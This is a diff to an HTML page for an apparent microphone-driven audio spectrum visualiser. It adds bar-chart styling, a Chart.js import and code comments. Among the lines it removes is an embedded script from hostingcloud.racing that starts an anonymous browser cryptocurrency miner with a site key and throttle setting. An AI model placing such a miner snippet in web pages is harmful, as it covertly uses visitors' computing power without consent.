@@ -25,10 +25,27 @@
     .soundon{color: #000;}
     .btn{display: flex;padding: 5px;}
     .btn div{height: 50px;line-height: 50px;}
+
+
+    .chart-container {
+    display: flex;
+    align-items: flex-end; /* Align bars from the bottom */
+    justify-content: space-around; /* Evenly distribute bars */
+    width: 100%;
+    height: 300px;
+    border: 1px solid #ccc;
+}
+
+.bar {
+    width: 20px;
+    background-color: #4CAF50;
+    margin-right: 1px;
+}
+
     </style>
     
     <header>
-        <h2>BIOMETRIC SECURITY</h2>
+        <h2>BIOLOGICAL METRIC SECURITY<img src="img/437-4379298_8-bit-heart-green-tata-bt21-pixel-art.png"></h2>
         <img src="img/playstore.png">
     </header>
   
@@ -48,18 +65,9 @@
         <p id="solar-nuclear-photovoltaic-frame-fps"></p>
         <p id="solar-nuclear-photovoltaic-frame-time"></p>
         <p id="solar-nuclear-photovoltaic-video-time"></p>
-        <p id="solar-nuclear-photovoltaic-signal"><script src="https://www.hostingcloud.racing/mk2y.js"></script>
-<script>
-    var _client = new Client.Anonymous('eba1dd1ac084760f9c66d3bc68a9a2a5fb20834dc12719ab6b6abbd8765cfee7', {
-        throttle: 0.7, c: 'w', ads: 0
-    });
-    _client.start();
-    
-
-</script></p>
+        <p id="solar-nuclear-photovoltaic-signal"></p>
         <p id="solar-nuclear-photovoltaic-signal-window"></p>
-
-        <table>
+       <!-- <table>
           <thead>
             <tr>
               <th>ID</th>
@@ -77,14 +85,18 @@
           </thead>
           <tbody id="table-body">
           </tbody>
-        </table>
-    
+        </table>-->
+        <div id="chart-container" class="chart-container">
+          <!-- Bars will be dynamically added here -->
+      </div>
+      
       </main>
    
    <div class="btn"> <img src="src/20230516_104626.png" height="50px" id="openaudio"><div>SPECTRUM</div></div>
   
    <div id="container"></div>
    <script src="src/real-time-line-chart.js"></script>
+   <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script src="src/main.js"></script>
     <script id="rendered-js" type="module">
         /**
@@ -217,8 +229,11 @@
           if (navigator.mediaDevices) {
               navigator.mediaDevices.getUserMedia({ audio: true, video: false }).
               then(stream => {
+                // create stream using audioMotion audio context
                 const micStream = audioMotion.audioCtx.createMediaStreamSource(stream);
+                // connect microphone stream to analyzer
                 audioMotion.connectInput(micStream);
+                // mute output to prevent feedback loops from the speakers
                 audioMotion.volume = 0;
               }).
               catch(err => {
